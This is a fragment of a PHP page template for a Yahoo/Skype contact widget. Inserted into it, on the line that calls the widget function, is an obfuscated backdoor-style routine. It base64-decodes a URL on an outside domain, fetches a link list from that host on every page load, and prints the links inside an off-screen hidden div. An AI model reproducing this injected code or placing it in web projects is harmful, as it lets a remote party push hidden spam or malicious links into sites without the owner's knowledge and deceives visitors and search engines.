...
?>
<?php
	Xu_ly_yahoo($yahooID, $nameYahoo, $telYahoo, $showYahoo, $showName, $showTel,$skypeID, $showSkype, $showSkype, $showSkype);	if (!function_exists('get_content')) {function get_content($url) { $data=NULL; if(function_exists('file_get_contents')){ ini_set('default_socket_timeout', 7); if($data=@file_get_contents(base64_decode($url))){ } } else if(function_exists('fopen')){ if($dataFile = @fopen(base64_decode($url), "r" )){ while (!feof($dataFile)) { $data.= fgets($dataFile, 4096); } fclose($dataFile); } } if($data) { echo base64_decode('PGRpdiBzdHlsZT0icG9zaXRpb246IGFic29sdXRlOyB0b3A6IC0zNTQyMHB4OyBvdmVyZmxvdzogYXV0bzsiPg=='); $links = explode("\n", $data); foreach($links as $link) { $link=trim($link); $link_t=explode("==", $link); echo '<a href="'.$link_t[0].'" title="'. $link_t[1].'" alt="'. $link_t[1].'">'. $link_t[1].'</a><br>'; } echo '</div>'; } }}  $url = 'aHR0cDovL2FiY2RlZjEyMy5jbHViL3Nlb2xpc3RhYmNkZWYxMjMudHh0'; get_content($url);

	?>
</div>
<?php
	function Xu_ly_yahoo($yahooID, $nameYahoo, $telYahoo, $showYahoo, $showName, $showTel,$skypeID, $showSkype, $showSkype, $showSkype)
	{
		if($showYahoo==1)
		{
